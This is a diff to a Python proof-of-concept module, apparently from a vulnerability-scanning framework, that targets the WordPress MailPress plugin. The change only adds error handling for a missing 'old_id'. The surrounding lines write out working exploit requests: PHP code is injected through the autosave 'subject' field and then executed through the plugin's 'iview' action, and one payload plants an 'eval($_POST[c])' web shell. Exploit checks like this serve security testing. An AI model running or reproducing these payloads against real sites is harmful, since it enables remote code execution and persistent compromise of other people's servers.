@@ -39,7 +39,9 @@ class Poc(ABPoc):
             data = "action=autosave&id=0&revision=-1&toemail=&toname=&fromemail=&fromname=&to_list=1&Theme=&subject=<?php phpinfo();?>&html=&plaintext=&mail_format=standard&autosave=1"
             url = self.target + payload
             r = requests.post(url, data=data)
-            old_id = int(re.findall(r'old_id="(\d+)"', r.text)[0])
+            old_id = 0
+            if re.findall(r'old_id="(\d+)"', r.text):
+                old_id = int(re.findall(r'old_id="(\d+)"', r.text)[0])
             verify_url = self.target + '/wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id={intid}'.format(intid=old_id)
             r = requests.get(verify_url)
 
@@ -59,7 +61,9 @@ class Poc(ABPoc):
             data = "action=autosave&id=0&revision=-1&toemail=&toname=&fromemail=&fromname=&to_list=1&Theme=&subject=<?php phpinfo();eval($_POST[c]);?>&html=&plaintext=&mail_format=standard&autosave=1"
             url = self.target + payload
             r = requests.post(url, data=data)
-            old_id = int(re.findall(r'old_id="(\d+)"', r.text)[0])
+            old_id = 0
+            if re.findall(r'old_id="(\d+)"', r.text):
+                old_id = int(re.findall(r'old_id="(\d+)"', r.text)[0])
             verify_url = self.target + '/wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id={intid}'.format(intid=old_id)
             r = requests.get(verify_url)
 
